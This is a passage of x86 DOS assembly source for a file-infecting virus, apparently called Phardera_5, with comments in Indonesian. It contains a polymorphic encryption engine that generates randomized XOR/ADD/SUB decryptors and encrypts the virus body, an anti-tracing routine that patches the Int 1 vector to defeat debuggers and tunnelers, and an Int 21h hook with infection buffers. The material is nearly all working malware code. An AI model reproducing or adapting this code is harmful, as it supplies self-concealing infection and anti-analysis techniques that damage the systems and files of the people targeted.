        mov     al,1 ptr cipher
        call    fix_pointer
        mov     2 ptr displace,di
        
        mov     ax,2 ptr saved_bp
        sub     ax,2 ptr pointval
        stosw

        call    rand_garbage
        
        call    rand3
        mov     al,1 ptr [si+2]
        or      al,0c3h
        mov     1 ptr encb2,al
        
        cmp     1 ptr cipher,0
        jne     fix_16imm
        mov     al,1 ptr [si+2]
        or      al,5
        stosb
        jmp     short set_imm

fix_16imm:
        mov     al,81h
        stosb
        mov     al,1 ptr [si+2]
        or      al,0c0h
        or      al,1 ptr cipher
        stosb

set_imm:
        call    get_rand
        stosw

        mov     2 ptr encval2,ax

        call    increase_pointer
        PENCODE enc_type

        TRAP    ret

enc_table       db      31h     ;XOR            ;Direct word operation
                db      33h     ;XOR reg,reg    ;Undo..
                db      30h

                db      01h     ;ADD
                db      2bh     ;SUB reg,reg
                db      0       ;ADD

                db      29h     ;SUB
                db      03h     ;ADD reg,reg
                db      28h

Rand3:
;Gets a number in ax, either 0,4,8, and indexes SI that distance into
;enc_table.
encrypt_rand:
        PDECODE enc_rnd
        call    get_rand
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     ax,dx
        xor     dx,dx
        mul     cx
        mov     si,offset enc_table
        add     si,ax
        PENCODE enc_rnd
        TRAP    ret

Encrypt_Virus:
        mov     si,2 ptr saved_si
        mov     cx,2 ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,2 ptr xorval
enc_loop:
        lodsw

        ;op ax,bx
        encbyte db      0       ;op
                db      0c3h

                db      81h
        encb2   db      0
        encval2 dw      0

        stosw
        loop    enc_loop
        TRAP    ret
endif


ifdef is_fun
;**************
;* Anti Int 1 *
;**************
anti_trace proc near
      push  ax bx si ds             ; disable any tunnelers.

      xor   ax,ax
      mov   ds,ax                   ; vector table
      lds   si,ds:[1*4]             ; DS:SI=Int 1 Address
      mov   bl,1 ptr [si]           ; save first byte of it.
      mov   1 ptr [si],0CFh         ; move an IRET at the entry point.

      pushf                         ; flags on stack.
      pop   ax                      ; flags into AX
      and   ah,11111110b            ; remove trap flag.
      push  ax                      ; flags back on stack
      popf                          ; set flags without any trap on.

      mov   1 ptr [si],bl           ; restore entry point.
      pop   ds si bx ax
      ret
anti_trace endp
endif

;**********************************
;* JMP Int 21h asli               *
;* Untuk mencegah pemanggilan     *
;*  interrupt berulang oleh virus *
;*                                *
;* Size of Virus in File          *
;**********************************
;* mnemonic JMP FAR
old_21:
      db   0EAh
eof:                                ; size infected
;* buffer
      old old_buf ?
      org  $+369 
auk:

      db    16 dup(?)
;*****************
;* Pesan & Kesan *
;*****************
m16:  if ((offset m16-start) mod 16) NE 0
        db (16-((offset m16-start) mod 16)) mod 16 dup(?)
      endif      
      nirwana  db (endcredits-credits) dup(?)   ; label shit!
      cayul    db 0

      bufhdr  header_exe ?

;* polymorphic
segtype         db      0       ;1 if com file
saved_cx        dw      0       ;the initial CX
saved_di        dw      0       ;the initial DI
saved_si        dw      0
saved_bp        dw      0
displace        dw      0
displace2       dw      0
                dw      0
displaceb       dw      0
inloop          db      0       ;=1 if inside a loop else 0
                                ;if set no '2 ptr' instructions made
loopstart       dw      0       ;for backwards 8 bit
loopf           dw      0       ;for forwards 8 bit
loopback        dw      0       ;backwards 16 bit
loopf16         dw      0       ;forwards 16 bit
xorval          dw      0
cipher          db      0
r_m             db      0       ;The r-m of the pointer

;***************************
;* Buffer Polymorphic      *
;* Size of Virus in Memory *
;***************************
eov:                          ; size memory * 2 for polymorphism
      db file_size dup(?) ; buffer for 1st install


geli21 proc far
      jmp   trap21
geli21 endp

end Phardera_5

;--- EOF -------------------------------------------------------------
